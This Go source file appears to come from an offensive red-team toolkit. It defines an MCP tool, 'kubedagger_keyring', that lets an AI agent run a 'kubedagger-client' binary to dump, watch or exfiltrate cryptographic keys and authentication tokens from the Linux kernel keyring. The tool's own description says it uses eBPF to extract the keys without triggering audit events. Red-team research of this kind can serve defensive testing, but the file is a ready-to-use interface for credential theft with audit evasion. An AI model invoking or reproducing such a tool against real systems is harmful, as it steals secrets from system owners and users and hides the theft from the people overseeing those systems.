package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type KeyringInput struct {
	Mode    string `json:"mode,omitempty"`
	KeyType string `json:"key_type,omitempty"`
}

type KeyringTool struct {
	exec executor.Executor
}

func NewKeyring(exec executor.Executor) *KeyringTool {
	return &KeyringTool{exec: exec}
}

func (t *KeyringTool) Name() string { return "kubedagger_keyring" }

func (t *KeyringTool) Description() string {
	return "Access the Linux kernel keyring to dump, watch, or exfiltrate cryptographic keys and authentication tokens stored by services. Intercepts keyring syscalls via eBPF to extract keys without triggering audit events."
}

func (t *KeyringTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"mode": {
				"type": "string",
				"enum": ["dump", "watch", "exfil"],
				"description": "Keyring operation: dump current keys, watch for new additions, or exfiltrate keys (default: dump)"
			},
			"key_type": {
				"type": "string",
				"enum": ["user", "logon", "session", "all"],
				"description": "Key type filter (default: all)"
			}
		}
	}`)
}

func (t *KeyringTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input KeyringInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	args := []string{"keyring"}
	if input.Mode != "" {
		args = append(args, "--mode", input.Mode)
	}
	if input.KeyType != "" {
		args = append(args, "--key-type", input.KeyType)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger keyring failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	mode := input.Mode
	if mode == "" {
		mode = "dump"
	}
	fmt.Fprintf(&sb, "## KubeDagger Keyring: %s\n\n", mode)
	if output == "" {
		sb.WriteString("No keys found.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
